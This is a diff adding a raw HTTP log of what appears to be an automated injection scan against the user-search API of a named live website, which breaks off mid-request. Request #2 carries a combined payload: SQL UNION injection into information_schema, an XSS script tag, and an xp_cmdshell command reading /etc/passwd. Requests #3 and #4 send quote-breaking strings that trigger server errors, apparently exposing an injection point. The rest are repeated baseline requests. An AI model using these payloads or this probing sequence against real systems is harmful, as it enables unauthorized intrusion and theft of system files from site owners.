@@ -1,0 +1,1188 @@
+HTTP request [#1]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#1] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=db8930fe97d24f58fd6c00df48244c35e1589277726; expires=Thu, 11-Jun-20 10:02:06 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9eeae89000002523c8da200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:06 GMT
+Cf-ray: 59234d5da9980252-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#2]:
+POST /api/search_user.php?qOYM=8014%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Cookie: __cfduid=db8930fe97d24f58fd6c00df48244c35e1589277726
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#2] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php?qOYM=8014%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
+Cf-request-id: 02a9eebb8c000002763438d200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:10 GMT
+Cf-ray: 59234d727e730276-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#3]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Cookie: __cfduid=db8930fe97d24f58fd6c00df48244c35e1589277726
+Content-length: 44
+Connection: close
+
+user_name=admin%28.%29%2C%27%2C..%22.&type=1
+
+HTTP response [#3] (500 Internal Server Error):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 0
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9eec9dc00006bb446b8a200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:13 GMT
+Cf-ray: 59234d896aed6bb4-SJC
+Content-type: text/html; charset=UTF-8
+
+
+
+############################################################################
+
+HTTP request [#4]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Cookie: __cfduid=db8930fe97d24f58fd6c00df48244c35e1589277726
+Content-length: 49
+Connection: close
+
+user_name=admin%27peJvvn%3C%27%22%3EbnMomB&type=1
+
+HTTP response [#4] (500 Internal Server Error):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 0
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9eed4110000025a99386200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:16 GMT
+Cf-ray: 59234d99be0f025a-SJC
+Content-type: text/html; charset=UTF-8
+
+
+
+############################################################################
+
+HTTP request [#5]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 48
+Connection: close
+
+user_name=user_name%3Dadmin%2A%26type%3D1&type=1
+
+HTTP response [#5] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d13e7709ba2409f4a4a1b2b8d8b48130c1589277741; expires=Thu, 11-Jun-20 10:02:21 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9eeea910000ed3fec8b9200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:22 GMT
+Cf-ray: 59234dbdb888ed3f-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#7]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#7] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=deee5e41244f93a8e6ccf97b2c1a190901589277752; expires=Thu, 11-Jun-20 10:02:32 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef154f0000935e909bf200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:32 GMT
+Cf-ray: 59234e0218be935e-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#8]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#8] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d9d238331ddba38ac9c0e817fbb350e321589277755; expires=Thu, 11-Jun-20 10:02:35 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef1edd0000ed67863b8200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:35 GMT
+Cf-ray: 59234e116f6ded67-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#9]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#9] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d8408a63fbfd942ade8972ba5c525c23a1589277758; expires=Thu, 11-Jun-20 10:02:38 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef2cdd0000ed47c61ad200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:39 GMT
+Cf-ray: 59234e27cf96ed47-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#10]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#10] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d9dc227c767cd2d814c9bfc521ac2a4161589277761; expires=Thu, 11-Jun-20 10:02:41 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef37a20000ed23b607f200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:41 GMT
+Cf-ray: 59234e390ef5ed23-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#11]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#11] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=da190051a29182b8739bc97fdfa9dcba71589277764; expires=Thu, 11-Jun-20 10:02:44 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef43490000027685be4200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:44 GMT
+Cf-ray: 59234e4bad090276-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#12]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#12] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d0ef091414726462fc4f4fe7bccce2d931589277768; expires=Thu, 11-Jun-20 10:02:48 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef546500006df47c9d6200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:49 GMT
+Cf-ray: 59234e670ef46df4-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#13]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#13] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d4355939d03138669c0e2733ddb777cb91589277771; expires=Thu, 11-Jun-20 10:02:51 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef603c0000934c443cb200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:52 GMT
+Cf-ray: 59234e79fdc3934c-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#14]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#14] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=de4799a116c4ea0302af04479e64d80d71589277775; expires=Thu, 11-Jun-20 10:02:55 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef6d1600006d28c435f200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:02:55 GMT
+Cf-ray: 59234e8e8a876d28-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#15]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#15] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d90326ed6c3281f4630c8affb98aa69011589277781; expires=Thu, 11-Jun-20 10:03:01 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef86f800006d829710a200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:01 GMT
+Cf-ray: 59234eb7ffa46d82-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#16]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#16] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d309d6e1a5fc1b2ea4626ef79c08d413e1589277785; expires=Thu, 11-Jun-20 10:03:05 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9ef94cc0000ed63ea97b200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:05 GMT
+Cf-ray: 59234ece1877ed63-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#17]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#17] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d84f2faebc702f31b737ffcabd9e88f1b1589277788; expires=Thu, 11-Jun-20 10:03:08 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9efa041000092b6f99b8200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:08 GMT
+Cf-ray: 59234ee06a8492b6-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#18]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#18] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=dfaa27438b5de973b476134e9f048aa3e1589277791; expires=Thu, 11-Jun-20 10:03:11 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9efad8b0000935e901aa200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:11 GMT
+Cf-ray: 59234ef5a9ea935e-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#19]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#19] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=d7894b443a99f8accd5c19a13b30e87fc1589277794; expires=Thu, 11-Jun-20 10:03:14 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9efb7a90000ed23c59d6200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:14 GMT
+Cf-ray: 59234f05dc79ed23-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#20]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
+User-agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13
+Content-length: 22
+Connection: close
+
+user_name=admin&type=1
+
+HTTP response [#20] (200 OK):
+Expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Content-length: 209
+X-content-type-options: nosniff
+X-powered-by: PHP/7.1.28
+Set-cookie: __cfduid=dce3363672d73e2c949112fb76de4b06e1589277799; expires=Thu, 11-Jun-20 10:03:19 GMT; path=/; domain=.jr386.com; HttpOnly; SameSite=Lax; Secure
+Cf-cache-status: DYNAMIC
+Strict-transport-security: max-age=0; includeSubDomains; preload
+Uri: https://jr386.com:443/api/search_user.php
+Cf-request-id: 02a9efcb310000ed43069ad200000001
+Server: cloudflare
+Connection: close
+Date: Tue, 12 May 2020 10:03:19 GMT
+Cf-ray: 59234f251833ed43-SJC
+Content-type: text/html; charset=UTF-8
+
+{"status":3,"data_info":"","notice_content":"\u5bf9\u4e0d\u8d77\uff0c\u60a8\u8f93\u5165\u7684\u7528\u6237\u4e0d\u80fd\u53c2\u52a0\u8be5\u6b21\u6d3b\u52a8\uff0c\u8bf7\u8054\u7cfb\u5ba2\u670d\u4eba\u5458\uff01"}
+
+############################################################################
+
+HTTP request [#21]:
+POST /api/search_user.php HTTP/1.1
+Host: jr386.com
+Accept-encoding: gzip,deflate
+Cache-control: no-cache
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: */*
